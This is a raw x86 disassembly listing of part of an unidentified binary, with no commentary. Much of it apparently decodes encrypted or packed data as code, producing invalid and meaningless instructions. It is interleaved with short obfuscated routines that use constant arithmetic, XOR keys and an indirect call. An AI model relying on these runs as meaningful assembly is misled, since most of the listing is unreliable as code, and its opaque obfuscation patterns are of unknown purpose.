  408bfe:	or     ch,cl
  408c00:	dec    ecx
  408c01:	hlt    
  408c02:	ins    BYTE PTR es:[edi],dx
  408c03:	std    
  408c04:	fwait
  408c05:	adc    BYTE PTR [eax-0x7a07cc27],ah
  408c0b:	mov    cl,BYTE PTR ds:0xd96e69f3
  408c11:	xchg   ecx,eax
  408c12:	push   edi
  408c13:	add    DWORD PTR ds:0x2cb94d2f,0xa00438e8
  408c1d:	fwait
  408c1e:	xor    eax,0x21a9abab
  408c23:	jmp    FWORD PTR [edx-0x4d34d64d]
  408c29:	shl    eax,0x21
  408c2c:	or     ebp,DWORD PTR [edi]
  408c2e:	iret   
  408c2f:	add    edx,DWORD PTR [esi+ebx*8+0x2f5f44f1]
  408c36:	mov    bh,0x1a
  408c38:	push   edi
  408c39:	imul   esi,DWORD PTR [ecx],0x3212e791
  408c3f:	stc    
  408c40:	lahf   
  408c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c42:	call   0x6336528f
  408c47:	inc    esi
  408c48:	or     edi,DWORD PTR [edx]
  408c4a:	dec    ebp
  408c4b:	xchg   BYTE PTR [eax-0x58bf7edc],cl
  408c51:	push   edx
  408c52:	and    al,BYTE PTR [edi+0xd]
  408c55:	pop    ds
  408c56:	inc    eax
  408c57:	dec    edi
  408c58:	ins    BYTE PTR es:[edi],dx
  408c59:	ins    DWORD PTR es:[edi],dx
  408c5a:	and    BYTE PTR ds:0xece7ef1d,dh
  408c60:	leave  
  408c61:	js     0x408c10
  408c63:	cdq    
  408c64:	test   BYTE PTR fs:[esi+ecx*1+0x56e755b6],dl
  408c6c:	sub    BYTE PTR [ecx+0x5b],0xca
  408c70:	mov    ebp,0x1f403290
  408c75:	cmp    BYTE PTR [edi+0x2c],cl
  408c78:	cli    
  408c79:	pop    esp
  408c7a:	test   dl,cl
  408c7c:	jnp    0x408c19
  408c7e:	cld    
  408c7f:	xor    DWORD PTR [edi+ebp*1],ebp
  408c82:	mov    al,0x1a
  408c84:	stc    
  408c85:	clc    
  408c86:	sbb    bl,dh
  408c88:	xchg   edx,eax
  408c89:	mov    ah,0x89
  408c8b:	add    dh,cl
  408c8d:	mov    DWORD PTR [esi+0x221e0948],edx
  408c93:	adc    BYTE PTR [ebx+0x73],al
  408c96:	je     0x408cc9
  408c98:	in     eax,dx
  408c99:	pusha  
  408c9a:	dec    esi
  408c9b:	mov    al,0x3b
  408c9d:	dec    BYTE PTR [ecx+0x75]
  408ca0:	(bad)  
  408ca1:	scas   eax,DWORD PTR es:[edi]
  408ca2:	sbb    DWORD PTR [edx],edi
  408ca4:	jo     0x408cf4
  408ca6:	fwait
  408ca7:	sub    bl,BYTE PTR [edi+0x37]
  408caa:	loopne 0x408cb9
  408cac:	sub    DWORD PTR ss:[edx-0x53b5cc13],esp
  408cb3:	jbe    0x408d0e
  408cb5:	mov    dl,0x5f
  408cb7:	cmp    bh,ch
  408cb9:	cmp    cl,BYTE PTR [ebp+0x5c]
  408cbc:	retf   
  408cbd:	adc    al,0x2b
  408cbf:	adc    edx,DWORD PTR [edi-0x30163128]
  408cc5:	sar    DWORD PTR ds:0x7030ebea,cl
  408ccb:	loope  0x408cd3
  408ccd:	pop    edx
  408cce:	sahf   
  408ccf:	pop    esp
  408cd0:	inc    edx
  408cd1:	nop
  408cd2:	mov    bl,0xca
  408cd4:	mov    edx,0x43c2b308
  408cd9:	xor    al,0x32
  408cdb:	pop    edi
  408cdc:	lods   eax,DWORD PTR ds:[esi]
  408cdd:	das    
  408cde:	divps  xmm2,XMMWORD PTR [ecx+ebp*8-0x37]
  408ce3:	inc    ebx
  408ce4:	cwde   
  408ce5:	into   
  408ce6:	movzx  eax,WORD PTR [eax+edx*4]
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x3ba3
  408d20:	sub    ah,BYTE PTR [ebx+0x3c]
  408d23:	cmp    DWORD PTR [edi],ebp
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408d31
  408d2c:	sub    DWORD PTR ds:0xce76421f,edx
  408d32:	not    DWORD PTR [edx-0x34503b3e]
  408d38:	or     BYTE PTR [edx],al
  408d3a:	xchg   ebp,eax
  408d3b:	sub    DWORD PTR [ebx+esi*8],edi
  408d3e:	icebp  
  408d3f:	jb     0x408d07
  408d41:	leave  
  408d42:	nop
  408d43:	loope  0x408cd9
  408d45:	dec    ecx
  408d46:	into   
  408d47:	rcr    DWORD PTR [ebp-0x2],0x99
  408d4b:	adc    DWORD PTR [edi+0x5e],esi
  408d4e:	jle    0x408da1
  408d50:	pushf  
  408d51:	stos   DWORD PTR es:[edi],eax
  408d52:	test   DWORD PTR [ebx-0x1c85b7b0],ebp
  408d58:	pop    ss
  408d59:	adc    edi,ebx
  408d5b:	mul    DWORD PTR [esi+0x20]
  408d5e:	es leave 
  408d60:	xchg   BYTE PTR [ebp+0x604dc244],cl
  408d66:	icebp  
  408d67:	lods   al,BYTE PTR ds:[esi]
  408d68:	xchg   ecx,eax
  408d69:	xchg   edx,eax
  408d6a:	(bad)  
  408d6b:	mov    ecx,0x161da880
  408d70:	push   cs
  408d71:	and    eax,DWORD PTR [ecx-0x4026b52a]
  408d77:	addr16 jno 0x408d18
  408d7a:	xor    esi,DWORD PTR [ecx+0x724936b2]
  408d80:	(bad)  
  408d81:	hlt    
  408d82:	mov    ebx,0x3be4c851
  408d87:	mov    al,0x1f
  408d89:	pop    esp
  408d8a:	pop    ebx
  408d8b:	ror    eax,cl
  408d8d:	sbb    DWORD PTR [ebp+eax*1+0x2bd8637a],esp
  408d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d95:	mov    DWORD PTR [ebx+0x38],ebx
  408d98:	sar    DWORD PTR [edx-0x14],1
  408d9b:	adc    dl,cl
  408d9d:	jmp    0xbefc:0xab2de5ac
  408da4:	std    
  408da5:	out    0x1a,al
  408da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408da8:	cmp    al,0x33
  408daa:	fdivr  st,st(6)
  408dac:	dec    edi
  408dad:	xor    BYTE PTR [ebp+0x43e5d4e8],ch
  408db3:	cmp    ecx,edi
  408db5:	repz sbb ebx,DWORD PTR [esp+ecx*1]
  408db9:	fdivr  QWORD PTR [eax+0x84c91f6]
  408dbf:	xor    al,0x4a
  408dc1:	int    0xfb
  408dc3:	push   0xde5f5fc0
  408dc8:	mov    ebp,0xea0cc798
  408dcd:	add    DWORD PTR [ecx+0x6d],0x502531c3
  408dd4:	or     eax,0x800e2cdd
  408dd9:	icebp  
  408dda:	mov    cl,0xe7
  408ddc:	push   edi
  408ddd:	or     ch,BYTE PTR [eax+0xb63ca7d]
  408de3:	cli    
  408de4:	(bad)  
  408de5:	mov    al,BYTE PTR [esi-0x6b1b649f]
  408deb:	push   ecx
  408dec:	push   ebx
  408ded:	fsub   QWORD PTR [esi-0x4fe22a9e]
  408df3:	jecxz  0x408e20
  408df5:	sbb    al,0xf2
  408df7:	or     DWORD PTR [esi],ecx
  408df9:	loop   0x408dea
  408dfb:	sti    
  408dfc:	add    BYTE PTR [edi+ebp*4-0x6908e680],bh
  408e03:	and    eax,DWORD PTR [edx-0x20]
  408e06:	iret   
  408e07:	pop    ds
  408e08:	inc    BYTE PTR [ebx+0x3292a59d]
  408e0e:	test   DWORD PTR [ebp-0x712a0ebe],eax
  408e14:	sub    edx,DWORD PTR [eax]
  408e16:	aad    0xf1
  408e18:	pop    es
  408e19:	jbe    0x408df4
  408e1b:	addr16 mov al,ds:0x1661
  408e1f:	inc    edi
  408e20:	iret   
  408e21:	rcr    DWORD PTR ds:0xcd420a79,cl
  408e27:	dec    esp
  408e28:	sub    al,0x8e
  408e2a:	(bad)  
  408e2b:	pop    esi
  408e2c:	push   ebx
  408e2d:	test   BYTE PTR ds:0xd83b9775,bh
  408e33:	repz test DWORD PTR ds:0x89c6037a,edi
  408e3a:	add    ch,cl
  408e3c:	and    al,0x1
  408e3e:	add    BYTE PTR [eax],al
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x27e7de2b
  408e4e:	xchg   edi,eax
  408e4f:	cmp    eax,0x7e7e2c35
  408e54:	or     bh,BYTE PTR [edi+0x7e]
  408e57:	jle    0x408e4f
  408e59:	and    bh,BYTE PTR [ecx+edx*1-0x66cbf577]
  408e60:	jmp    0x46ff:0xf67ec2bb
  408e67:	test   al,0x82
  408e69:	push   cs
  408e6a:	int    0x2c
  408e6c:	mov    DWORD PTR [edi+0x59d6b9a4],edx
  408e72:	cdq    
  408e73:	add    eax,0xdca57c6d
  408e78:	jle    0x408e59
  408e7a:	cmp    DWORD PTR [eax],ebx
  408e7c:	mov    cl,0xa0
  408e7e:	or     BYTE PTR [edx+0x4f5f44cc],cl
  408e84:	push   0x23
  408e86:	xchg   DWORD PTR [ebx-0x20],eax
  408e89:	iret   
  408e8a:	add    BYTE PTR [edi],dh
  408e8c:	mov    dl,0xa
  408e8e:	sar    DWORD PTR [eax-0x49c2bd6d],1
  408e94:	add    DWORD PTR [ebx-0x43937090],esi
  408e9a:	mov    eax,ds:0xdf146142
  408e9f:	leave  
  408ea0:	inc    ecx
  408ea1:	test   al,0xeb
  408ea3:	outs   dx,DWORD PTR ds:[esi]
  408ea4:	inc    edi
  408ea5:	and    al,0x8c
  408ea7:	jle    0x408f1f
  408ea9:	xor    eax,0x8289bf79
  408eae:	cmp    al,0x64
  408eb0:	mov    ecx,0xe44437ef
  408eb5:	loop   0x408eed
  408eb7:	shr    DWORD PTR [edx],cl
  408eb9:	xor    edi,DWORD PTR [edi+0x1c56011f]
  408ebf:	aad    0x86
  408ec1:	sub    al,0x65
  408ec3:	test   al,0x25
  408ec5:	paddsb mm5,mm4
  408ec8:	sub    bh,BYTE PTR [edi+0x59]
  408ecb:	mov    ecx,0x9fb38d65
  408ed0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed1:	and    dl,dh
  408ed3:	popf   
  408ed4:	loope  0x408f42
  408ed6:	lea    edx,[eax+0x35]
  408ed9:	jnp    0x408f4b
  408edb:	(bad)  
  408edc:	push   0x76
  408ede:	outs   dx,BYTE PTR ds:[esi]
  408edf:	and    DWORD PTR [ecx-0x637e7894],eax
  408ee5:	(bad)  
  408ee6:	out    0x62,al
  408ee8:	or     DWORD PTR ds:0xe38b4378,edi
  408eee:	xchg   edi,eax
  408eef:	mov    ds:0xdde232e2,al
  408ef4:	mov    edx,0xba424a02
  408ef9:	loope  0x408e94
  408efb:	xchg   DWORD PTR [esp+ecx*1],ebx
  408efe:	scas   al,BYTE PTR es:[edi]
  408eff:	aaa    
  408f00:	xchg   bl,cl
  408f02:	mov    WORD PTR [edi],?
  408f04:	mov    ds:0x1cdf9648,al
  408f09:	or     ebx,ecx
  408f0b:	loope  0x408f62
  408f0d:	pop    ebx
  408f0e:	or     esi,DWORD PTR [ecx-0x63]
  408f11:	or     al,0x59
  408f13:	cmc    
  408f14:	(bad)  
  408f15:	dec    esp
  408f16:	mov    ?,WORD PTR [edx-0x4b]
  408f19:	jb     0x408ec7
  408f1b:	ret    
  408f1c:	mov    DWORD PTR [ebx],edx
  408f1e:	add    esp,ebx
  408f20:	mov    ebx,0xa50760dc
  408f25:	pcmpeqw mm1,mm5
  408f28:	test   eax,0x28b682d3
  408f2d:	ret    
  408f2e:	pusha  
  408f2f:	loop   0x408f01
  408f31:	mov    ah,0xa8
  408f33:	mul    DWORD PTR [edi]
  408f35:	jle    0x408ed8
  408f37:	and    eax,0x9d4c0750
  408f3c:	in     al,dx
  408f3d:	repz stc 
  408f3f:	cmp    eax,0x6b962fa2
  408f44:	xchg   DWORD PTR [eax],ecx
  408f46:	pushf  
  408f47:	sahf   
  408f48:	xor    dl,BYTE PTR [esi+0x3]
  408f4b:	adc    DWORD PTR [edx+0x15],ebp
  408f4e:	aaa    
  408f4f:	sbb    esi,DWORD PTR [ecx-0x74]
  408f52:	fldenv [eax+0x6f]
  408f55:	mov    WORD PTR ds:0x96b60b23,ds
  408f5b:	cmp    ecx,ecx
  408f5d:	out    dx,al
  408f5e:	adc    edi,edx
  408f60:	enter  0xa5e2,0x23
  408f64:	mov    eax,DWORD PTR [ebp-0x8]
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0x292b935
  408fab:	jno    0x408f42
  408fad:	shr    DWORD PTR ds:0x7f0a7e7e,0x7e
  408fb4:	jle    0x408ff9
  408fb6:	jbe    0x408fa9
  408fb8:	lods   al,BYTE PTR ds:[esi]
  408fb9:	sbb    BYTE PTR [ebp+eiz*1-0xa],cl
  408fbd:	jmp    0xeac5a66
  408fc2:	push   ss
  408fc3:	adc    edx,DWORD PTR ds:0x51857d55
  408fc9:	pop    esp
  408fca:	(bad)  
  408fcb:	jbe    0x408fe3
  408fcd:	aaa    
  408fce:	cmp    BYTE PTR [ebp-0x18],bh
  408fd1:	jle    0x408fc2
  408fd3:	xlat   BYTE PTR ds:[ebx]
  408fd4:	push   ecx
  408fd5:	test   BYTE PTR [ebp+0x37c6f61e],bl
  408fdb:	dec    edi
  408fdc:	dec    edx
  408fdd:	push   edi
  408fde:	ja     0x40903d
  408fe0:	add    BYTE PTR [ecx+0xdfe1385],bh
  408fe6:	test   BYTE PTR [ebp-0x5c],0x30
  408fea:	popa   
  408feb:	mov    al,ds:0x2b3b2a27
  408ff0:	or     eax,0x3f76e008
  408ff5:	pop    es
  408ff6:	push   esp
  408ff7:	xor    edx,DWORD PTR [eax]
  408ff9:	adc    ebp,ecx
  408ffb:	xor    eax,0xb274a42e
  409000:	or     bl,BYTE PTR [ecx+0x5]
  409003:	lods   al,BYTE PTR ds:[esi]
  409004:	sti    
  409005:	fs xor eax,0xd43cc024
  40900b:	or     esp,edx
  40900d:	push   ebp
  40900e:	sbb    BYTE PTR [edi+0x4],0x4
  409012:	es jb  0x408fa2
  409015:	pushf  
  409016:	ret    
  409017:	sub    BYTE PTR [ebx-0x1c921d6d],bl
  40901d:	xor    cl,dl
  40901f:	ins    DWORD PTR es:[edi],dx
  409020:	pop    esp
  409021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409022:	adc    al,0xa7
  409024:	mov    bl,0x2e
  409026:	mov    ?,WORD PTR ds:0x322ae0dd
  40902c:	repz in eax,dx
  40902e:	in     eax,0xf7
  409030:	sub    ch,BYTE PTR [eax-0x7aae76a1]
  409036:	mov    dl,0x30
  409038:	sub    ch,bl
  40903a:	fild   DWORD PTR [edi+0x38]
  40903d:	jne    0x4090ba
  40903f:	mov    ecx,DWORD PTR [ecx+0x2c]
  409042:	ds std 
  409044:	mov    ch,0x99
  409046:	jbe    0x408fd1
  409048:	jecxz  0x408fe9
  40904a:	push   eax
  40904b:	and    eax,0x74942ed8
  409050:	(bad)  
  409051:	mov    bl,0x8e
  409053:	popa   
  409054:	adc    ah,ch
  409056:	aas    
  409057:	jne    0x409062
  409059:	jns    0x408fde
  40905b:	jbe    0x4090c6
  40905d:	retf   
  40905e:	jne    0x40908b
  409060:	pop    ss
  409061:	cmp    eax,0xb6c25373
  409066:	aaa    
  409067:	lods   eax,DWORD PTR ds:[esi]
  409068:	mov    al,0x7a
  40906a:	fsub   DWORD PTR [ebx-0x7f95dde2]
  409070:	mov    esp,0x8e61d232
  409075:	ins    DWORD PTR es:[edi],dx
  409076:	inc    esi
  409077:	mov    al,ds:0xde7b4e30
  40907c:	mov    DWORD PTR [edi],edi
  40907e:	dec    ebx
  40907f:	push   cs
  409080:	addr16 aam 0x50
  409083:	cdq    
  409084:	push   ebp
  409085:	mov    eax,0x489d1228
  40908a:	lock imul dl
  40908d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40908e:	das    
  40908f:	cdq    
  409090:	inc    edi
  409091:	inc    eax
  409092:	xchg   DWORD PTR [eax-0x611db5bf],ecx
  409098:	in     eax,dx
  409099:	xor    esi,0x25be6aec
  40909f:	leave  
  4090a0:	imul   esp
  4090a2:	or     eax,0xc550e4bf
  4090a7:	aam    0xd3
  4090a9:	cwde   
  4090aa:	sbb    DWORD PTR [esi-0x5de2ff2b],esi
  4090b0:	in     al,0x3b
  4090b2:	icebp  
  4090b3:	push   ss
  4090b4:	mov    edx,0x137d8f81
  4090b9:	xchg   esp,eax
  4090ba:	es mov dl,0x2d
  4090bd:	call   0x12be:0xfe73eba
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	loope  0x4090fd
  4090fc:	mov    WORD PTR [edx],gs
  4090fe:	frstor [edx]
  409100:	jle    0x409180
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x4090a6
  409107:	aas    
  409108:	fcom   QWORD PTR [ecx+0x59]
  40910b:	xchg   BYTE PTR [ecx-0x51816bff],bh
  409111:	dec    esi
  409112:	inc    ecx
  409113:	pop    ss
  409114:	fcomp  QWORD PTR [edx-0x6cf5091b]
  40911a:	pop    ebx
  40911b:	retf   0xa284
  40911e:	sahf   
  40911f:	test   DWORD PTR [esi],eax
  409121:	xchg   DWORD PTR [edi+0xe],edi
  409124:	scas   al,BYTE PTR es:[edi]
  409125:	scas   al,BYTE PTR es:[edi]
  409126:	mov    ah,0x72
  409128:	sbb    eax,0x14bd4e3c
  40912d:	add    ah,BYTE PTR [eax+0x1e7fbf3]
  409133:	mov    ds:0xc637138b,al
  409138:	dec    ecx
  409139:	pop    esp
  40913a:	dec    ebx
  40913b:	outs   dx,DWORD PTR ds:[esi]
  40913c:	ins    BYTE PTR es:[edi],dx
  40913d:	sar    DWORD PTR [esi-0x731e0c25],1
  409143:	add    al,0xf6
  409145:	inc    edi
  409146:	(bad)  
  409147:	adc    BYTE PTR [esi-0x661ed42b],ch
  40914d:	push   esp
  40914e:	fcom   QWORD PTR [edi-0x2c]
  409151:	mov    WORD PTR [ebp+0x11],cs
  409154:	lds    edi,FWORD PTR [esi]
  409156:	inc    ebx
  409157:	int    0x1a
  409159:	pusha  
  40915a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40915b:	xchg   esi,eax
  40915c:	inc    edx
  40915d:	or     ch,dl
  40915f:	cmp    eax,0x7d1ddc31
  409164:	daa    
  409165:	pop    ebp
  409166:	call   0x490b:0x5142b27a
  40916d:	nop
  40916e:	mov    dl,ch
  409170:	pusha  
  409171:	cmp    DWORD PTR [eax],eax
  409173:	xchg   ebp,eax
  409174:	mov    esp,0x581da1f9
  409179:	aam    0x81
  40917b:	cmp    al,0x1c
  40917d:	mov    al,0x78
  40917f:	pushf  
  409180:	inc    esp
  409181:	sub    eax,0x83d2c90c
  409186:	(bad)  
  409187:	in     al,0x42
  409189:	jecxz  0x40920a
  40918b:	mov    ds:0x2d4bed19,eax
  409190:	inc    ebp
  409191:	test   DWORD PTR [edi-0x684b03a9],esi
  409197:	(bad)  
  409198:	push   edi
  409199:	mov    ch,0x81
  40919b:	xor    dl,cl
  40919d:	aas    
  40919e:	sbb    edx,0xd
  4091a1:	fsub   st(3),st
  4091a3:	mov    edx,0x3a02a075
  4091a8:	mov    dl,cl
  4091aa:	cmp    eax,0xe0b7db88
  4091af:	cmp    eax,0xae8e6ee4
  4091b4:	cmp    ebp,eax
  4091b6:	or     bl,BYTE PTR [edi-0x57]
  4091b9:	dec    ebp
  4091ba:	mov    al,ds:0x9cc59cc9
  4091bf:	sti    
  4091c0:	fnstenv [ebx+0x36]
  4091c3:	sbb    al,bh
  4091c5:	or     eax,0x83c34407
  4091ca:	int3   
  4091cb:	cmc    
  4091cc:	test   eax,0xe2a907f5
  4091d1:	xchg   BYTE PTR [eax-0x6e],ah
  4091d4:	fimul  DWORD PTR [esi]
  4091d6:	inc    ebp
  4091d7:	ficomp DWORD PTR [eax-0x18]
  4091da:	push   eax
  4091db:	push   cs
  4091dc:	mov    cl,0x8a
  4091de:	mov    ds:0x10473d18,eax
  4091e3:	xchg   edi,eax
  4091e4:	mov    edx,0xb89d7467
  4091e9:	ss cmp al,0x45
  4091ec:	and    cl,BYTE PTR [ebx+edx*4]
  4091ef:	jo     0x40921c
  4091f1:	and    esi,DWORD PTR [esi]
  4091f3:	cwde   
  4091f4:	jge    0x4091d2
  4091f6:	hlt    
  4091f7:	(bad)  
  4091f8:	sub    esi,DWORD PTR [ecx]
  4091fa:	mov    al,ds:0x71962444
  4091ff:	pop    es
  409200:	clc    
  409201:	or     BYTE PTR [edx],bh
  409203:	lods   al,BYTE PTR ds:[esi]
  409204:	(bad)  
  409205:	ret    0x895a
  409208:	push   esi
  409209:	ins    BYTE PTR es:[edi],dx
  40920a:	test   BYTE PTR ds:0x8181c5fa,bh
  409210:	xor    ah,0x8b
  409213:	push   ebp
  409214:	or     BYTE PTR [ebx],dh
  409216:	ror    DWORD PTR [ebp+0x729f1084],0x32
  40921d:	add    BYTE PTR [ecx+0x45ff0845],cl
  409223:	or     al,0xe9
  409225:	inc    ebp
  409226:	std    
  409227:	(bad)  
  409228:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x53785839]
  409240:	jno    0x409235
  409242:	aad    0xe9
  409244:	and    edi,DWORD PTR [esi+0x7e]
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x4091ec
  40924c:	out    0x6b,eax
  40924e:	pop    edi
  40924f:	jge    0x409275
  409251:	rcl    DWORD PTR [esi+esi*8],1
  409254:	mov    WORD PTR [ecx-0x51],cs
  409257:	adc    al,ah
  409259:	and    BYTE PTR ds:0x231ff8f3,bl
  40925f:	retf   0x49b3
  409262:	push   ss
  409263:	mov    bl,0xca
  409265:	jl     0x4091f5
  409267:	adc    DWORD PTR [ebx-0x2a50b27f],ebx
  40926d:	sbb    edi,eax
  40926f:	dec    esp
  409270:	ja     0x40924c
  409272:	out    0x7a,eax
  409274:	dec    esi
  409275:	sahf   
  409276:	sub    bh,0x72
  409279:	mov    al,0x53
  40927b:	mov    cl,0xf2
  40927d:	mov    eax,eax
  40927f:	fnstenv [ebp+0x2567f369]
  409285:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409287:	push   eax
  409288:	mov    eax,ds:0xdbd0592d
  40928d:	cmc    
  40928e:	mov    esi,0xb3d1411f
  409293:	bnd jne 0x4092b8
  409296:	inc    edi
  409297:	(bad)  
  409298:	push   eax
  409299:	fnstsw WORD PTR [ebx+0x15]
  40929c:	repz ja 0x40931a
  40929f:	dec    edx
  4092a0:	inc    edi
  4092a1:	mov    eax,0x5c2ef433
  4092a6:	bound  esi,QWORD PTR [esi-0x72]
  4092a9:	push   ds
  4092aa:	push   eax
  4092ab:	sub    BYTE PTR [eax+ecx*8],0x4e
  4092af:	xchg   ecx,eax
  4092b0:	fwait
  4092b1:	shr    cl,0xc7
  4092b4:	sti    
  4092b5:	push   esp
  4092b6:	xchg   edx,eax
  4092b7:	add    BYTE PTR [eax],al
  4092b9:	icebp  
  4092ba:	pop    esi
  4092bb:	mov    esi,DWORD PTR [ebp-0x15]
  4092be:	rol    ch,1
  4092c0:	rcl    BYTE PTR [ecx],cl
  4092c2:	inc    ebx
  4092c3:	push   cs
  4092c4:	sbb    dl,cl
  4092c6:	push   edi
  4092c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c8:	cwde   
  4092c9:	lds    ecx,FWORD PTR [edi+ebx*8-0x61]
  4092cd:	pop    esi
  4092ce:	cmp    edi,DWORD PTR es:[eax+edi*1+0x733c47cf]
  4092d6:	mov    ebx,0x4304570d
  4092db:	loope  0x40935a
  4092dd:	mov    edx,0x8900e8c0
  4092e2:	scas   al,BYTE PTR es:[edi]
  4092e3:	jns    0x409333
  4092e5:	cdq    
  4092e6:	xor    al,BYTE PTR [edx+0x4a5ac5d2]
  4092ec:	int    0x65
  4092ee:	aaa    
  4092ef:	out    0x62,eax
  4092f1:	mov    dh,0xd8
  4092f3:	add    DWORD PTR [ebx-0x643bb445],0x6cd2f3e3
  4092fd:	add    al,0xa7
  4092ff:	dec    ebx
  409300:	pop    edi
  409301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409302:	push   DWORD PTR [eax-0x14bc2d48]
  409308:	loop   0x4092c2
  40930a:	daa    
  40930b:	mov    ebp,ebp
  40930d:	xlat   BYTE PTR ds:[ebx]
  40930e:	mov    cs,esp
  409310:	mov    esp,0x420e95e1
  409315:	push   ebp
  409316:	pop    ebp
  409317:	retf   0x1184
  40931a:	fild   WORD PTR [edx-0x7dc5ee20]
  409320:	cmp    esi,edx
  409322:	mov    DWORD PTR [ecx-0x16],ebp
  409325:	shl    BYTE PTR [edx+ebx*8-0x9d6a050],cl
  40932c:	(bad)  
  40932d:	scas   al,BYTE PTR es:[edi]
  40932e:	adc    BYTE PTR [esi],0xb5
  409331:	ins    BYTE PTR es:[edi],dx
  409332:	adc    eax,0x209d731c
  409337:	sub    ah,BYTE PTR ds:0x801b55c1
  40933d:	hlt    
  40933e:	pop    ebx
  40933f:	lods   eax,DWORD PTR ds:[esi]
  409340:	sbb    esp,edx
  409342:	data16 xor BYTE PTR [ecx-0x3b570942],0x96
  40934a:	adc    eax,0x8fbae5a
  40934f:	jge    0x4092ef
  409351:	sub    eax,DWORD PTR [ebx-0x10da1779]
  409357:	mov    ecx,DWORD PTR [ebp+0x10]
  40935a:	add    eax,esi
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4233d7,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x4122ec,0x4233d7
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x4122f8,0x417d11
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4233cf,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4233cf
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4233cf,edx
  4093bd:	cmp    DWORD PTR ds:0x4233cf,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4233cf,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41230c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x4122f0
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41aa4a,0x417d19
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412328
  409412:	mov    esi,DWORD PTR ds:0x41ff97
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
